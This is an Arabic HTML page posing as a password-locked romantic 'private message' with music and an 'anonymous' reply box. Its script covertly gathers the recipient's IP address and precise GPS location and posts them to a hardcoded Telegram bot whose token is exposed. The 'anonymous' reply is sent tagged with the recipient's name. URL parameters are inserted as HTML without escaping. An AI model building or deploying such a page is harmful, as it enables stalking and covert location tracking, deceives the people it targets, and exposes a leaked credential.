<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رسالة خاصة</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="card" id="mainContainer">
        <div id="loginView">
            <div class="heart-box">
                <i class="fa-solid fa-heart" style="color: white;"></i>
            </div>
            <h2>رسالة خاصة 💌</h2>
            <p class="subtitle" id="lockSubtitle">اكتب الباسورد علشان تقرأ الرسالة</p>
            <input type="password" id="passInput" placeholder="اكتب الباسورد هنا..." onkeypress="if(event.key==='Enter') verifyPassword();">
            <button class="btn" onclick="verifyPassword()">
                <i class="fa-solid fa-envelope-open"></i> فتح الرسالة
            </button>
            <div id="errorMsg" class="error"></div>
        </div>
    </div>

    <script>
        let dbData = {};
        const urlParams = new URLSearchParams(window.location.search);
        let currentSlug = urlParams.get('to') || window.location.hash.substring(1) || "first";

        const botToken = '8882621676:AAFNQ0B3q6rPSMTIujyIHGYiep9xNM1rgZU';
        const chatId = '8718173410';

        // دالة لجلب الـ IP وربطه بالدخول وإرسال تنبيه لتليجرام
        async function sendVisitorInfo(recipientName) {
            try {
                // جلب الـ IP
                let ipInfo = "غير معروف";
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    ipInfo = ipData.ip;
                } catch (err) {
                    console.log("تعذر جلب الـ IP");
                }

                // طلب إذن اللوكيشن
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                            
                            const msg = `📍 تم فتح الرسالة بواسطة الشخص (${recipientName})!\n\n🌐 الـ IP: ${ipInfo}\n🗺️ اللوكيشن بالتحديد:\n${mapsLink}`;
                            sendToTelegram(msg);
                        },
                        (error) => {
                            // لو رفض إذن اللوكيشن، نبعث الـ IP على الأقل
                            const msg = `🔓 تم فتح الرسالة بواسطة الشخص (${recipientName}) ولكن رفض إذن اللوكيشن.\n\n🌐 الـ IP: ${ipInfo}`;
                            sendToTelegram(msg);
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                } else {
                    const msg = `🔓 تم فتح الرسالة بواسطة الشخص (${recipientName}).\n\n🌐 الـ IP: ${ipInfo}`;
                    sendToTelegram(msg);
                }
            } catch (e) {
                console.log("خطأ في تتبع الزائر");
            }
        }

        function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            }).catch(e => console.log(e));
        }

        async function fetchDatabase() {
            try {
                const res = await fetch('db.json?v=' + Date.now());
                if (res.ok) {
                    dbData = await res.json();
                    if (dbData[currentSlug] && dbData[currentSlug].name) {
                        document.getElementById('lockSubtitle').innerText = `اكتب الباسورد علشان تقرأ الرسالة يا ${dbData[currentSlug].name}`;
                    }
                }
            } catch (e) {
                console.log("جاري الاعتماد على الرابط المباشر");
            }
        }

        fetchDatabase();

        async function verifyPassword() {
            const passInput = document.getElementById('passInput');
            const errorDiv = document.getElementById('errorMsg');
            const enteredPass = passInput.value.trim();

            if (!enteredPass) {
                errorDiv.innerText = 'يرجى كتابة الباسورد أولاً!';
                return;
            }

            errorDiv.innerText = 'جاري التحقق...';

            if (Object.keys(dbData).length === 0) {
                await fetchDatabase();
            }

            let correctPass = "1234";
            if (dbData[currentSlug] && dbData[currentSlug].password !== undefined) {
                correctPass = String(dbData[currentSlug].password).trim();
            } else if (urlParams.get('pass')) {
                correctPass = urlParams.get('pass').trim();
            }

            if (enteredPass === correctPass) {
                const userInfo = dbData[currentSlug];
                const recipientName = userInfo ? (userInfo.name || currentSlug) : (urlParams.get('to') || currentSlug);
                
                // إرسال اللوكيشن والـ IP فوراً عند نجاح فتح الرسالة
                sendVisitorInfo(recipientName);

                showContent(userInfo);
            } else {
                errorDiv.innerText = 'كلمة المرور غير صحيحة، حاول مرة أخرى.';
            }
        }

        function showContent(userInfo) {
            const recipientName = userInfo ? (userInfo.name || currentSlug) : (urlParams.get('to') || currentSlug);
            const messageText = userInfo ? (userInfo.message || "أهلاً بك! تم إنهاء تجهيز هذه الرسالة الخاصة لك.") : (urlParams.get('msg') || "أهلاً بك! تم إنهاء تجهيز هذه الرسالة الخاصة لك.");
            const songTitle = userInfo && userInfo.song_title ? userInfo.song_title : (urlParams.get('title') || "مقطوعة هادئة");
            const songUrl = (userInfo && userInfo.song_link && userInfo.song_link.startsWith('http')) 
                            ? userInfo.song_link 
                            : (urlParams.get('song') || "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3");

            document.getElementById('mainContainer').innerHTML = `
                <div class="heart-box">
                    <i class="fa-solid fa-heart" style="color: white;"></i>
                </div>
                <h2>رسالة إلى: <span id="recipientName">${recipientName}</span></h2>
                <p class="subtitle">رسالة سرية مخصصة</p>

                <div class="quote-box">
                    <i class="fa-solid fa-quote-right quote-mark-right"></i>
                    <p>${messageText}</p>
                    <i class="fa-solid fa-quote-left quote-mark-left"></i>
                </div>

                <audio id="bgAudio" src="${songUrl}" loop></audio>
                
                <div class="music-player">
                    <button class="play-btn" id="playBtn" onclick="togglePlay()"><i class="fa-solid fa-play"></i> تشغيل</button>
                    <div class="music-info">
                        <p class="title">${songTitle}</p>
                        <p class="desc">موسيقى استرخاء</p>
                    </div>
                    <div class="music-icon-box">
                        <i class="fa-solid fa-music"></i>
                    </div>
                </div>

                <div class="reply-section">
                    <label>رد على المرسل (بشكل مجهول):</label>
                    <textarea id="replyMsg" placeholder="اكتب ردك هنا..."></textarea>
                    <button class="btn" onclick="sendReply('${recipientName}')">
                        <i class="fa-solid fa-paper-plane"></i> إرسال الرد سراً
                    </button>
                </div>
            `;
        }

        function togglePlay() {
            const audio = document.getElementById('bgAudio');
            const playBtn = document.getElementById('playBtn');
            if (audio.paused) {
                audio.play();
                playBtn.innerHTML = '<i class="fa-solid fa-pause"></i> إيقاف';
            } else {
                audio.pause();
                playBtn.innerHTML = '<i class="fa-solid fa-play"></i> تشغيل';
            }
        }

        function sendReply(name) {
            const message = document.getElementById('replyMsg').value.trim();
            if (!message) {
                alert('الرجاء كتابة رد أولاً!');
                return;
            }

            const textToTelegram = `💌 رد جديد من (${name}):\n\n${message}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: textToTelegram })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    alert('تم إرسال الرد سراً بنجاح! شكراً لك.');
                    document.getElementById('replyMsg').value = '';
                } else {
                    alert('حدث خطأ أثناء الإرسال.');
                }
            })
            .catch(() => alert('تأكد من اتصالك بالإنترنت.'));
        }
    </script>
</body>
</html>
